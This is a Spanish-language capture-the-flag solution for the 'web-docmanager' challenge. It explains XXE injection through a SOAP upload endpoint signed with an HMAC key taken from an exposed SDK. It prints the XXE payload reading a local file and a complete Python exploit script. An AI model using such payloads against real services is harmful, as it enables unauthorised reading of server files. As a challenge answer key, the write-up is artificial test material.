## Solución — web-docmanager · XXE en SOAP

**Categoría:** web · **Dificultad:** insane · **Puntos:** 700 · **Vuln:** XXE (XML External Entity Injection) via SOAP con firma HMAC

### Resumen
El sistema DocManager expone una API SOAP. El parser XML lxml tiene DTD processing habilitado, lo que permite inyectar entidades externas. El endpoint real está en `/ws/document/v2/upload` (no en `/soap/upload`). Requiere firma HMAC-SHA256 derivable del SDK expuesto.

### Pasos de Explotación

1. **Descubrir el endpoint real**: `/api/docs` menciona `/ws/document/v2/upload`, el WSDL en `/static/wsdl/docmanager.wsdl` confirma la ruta.

2. **Obtener la clave de firma**: leer `/static/sdk/docmanager-client.py` → `_SIGNING_KEY = b"DocMgr-2024-K3y-Pr0d"`

3. **Construir el payload XXE**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:doc="http://docmanager.internal/v2">
  <soapenv:Header><doc:Auth><doc:ApiVersion>2.4</doc:ApiVersion></doc:Auth></soapenv:Header>
  <soapenv:Body>
    <doc:UploadDocument>
      <doc:filename>&xxe;</doc:filename>
      <doc:content_type>application/pdf</doc:content_type>
      <doc:metadata>
        <doc:author>test</doc:author>
        <doc:department>IT</doc:department>
      </doc:metadata>
    </doc:UploadDocument>
  </soapenv:Body>
</soapenv:Envelope>
```

4. **Calcular la firma y enviar**:
```python
import hashlib, hmac
sig = hmac.new(b"DocMgr-2024-K3y-Pr0d", payload_bytes, hashlib.sha256).hexdigest()
```

5. La respuesta incluye `"filename": "<contenido de /flag.txt>"` → flag obtenida.

### Script de exploit completo
```python
#!/usr/bin/env python3
import hashlib, hmac, sys, json
import urllib.request

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
SIGNING_KEY = b"DocMgr-2024-K3y-Pr0d"

payload = b"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:doc="http://docmanager.internal/v2">
  <soapenv:Header><doc:Auth><doc:ApiVersion>2.4</doc:ApiVersion></doc:Auth></soapenv:Header>
  <soapenv:Body>
    <doc:UploadDocument>
      <doc:filename>&xxe;</doc:filename>
      <doc:content_type>application/pdf</doc:content_type>
      <doc:metadata>
        <doc:author>auditor</doc:author>
        <doc:department>Security</doc:department>
      </doc:metadata>
    </doc:UploadDocument>
  </soapenv:Body>
</soapenv:Envelope>"""

sig = hmac.new(SIGNING_KEY, payload, hashlib.sha256).hexdigest()
req = urllib.request.Request(
    f"{TARGET}/ws/document/v2/upload",
    data=payload,
    headers={"Content-Type": "text/xml; charset=utf-8",
             "SOAPAction": "UploadDocument",
             "X-Api-Signature": sig},
    method="POST"
)
with urllib.request.urlopen(req) as resp:
    data = json.loads(resp.read())
    print(json.dumps(data, indent=2))
    flag = data.get("metadata", {}).get("filename", "")
    print(f"\n[FLAG] {flag}")
```

### Por qué es INSANE
- El endpoint real no es obvio (requiere leer docs/WSDL)
- La firma HMAC añade una capa extra de investigación
- La estructura SOAP multi-namespace es compleja de construir correctamente
- lxml con DTD processing no está documentado como inseguro en la mayoría de tutoriales
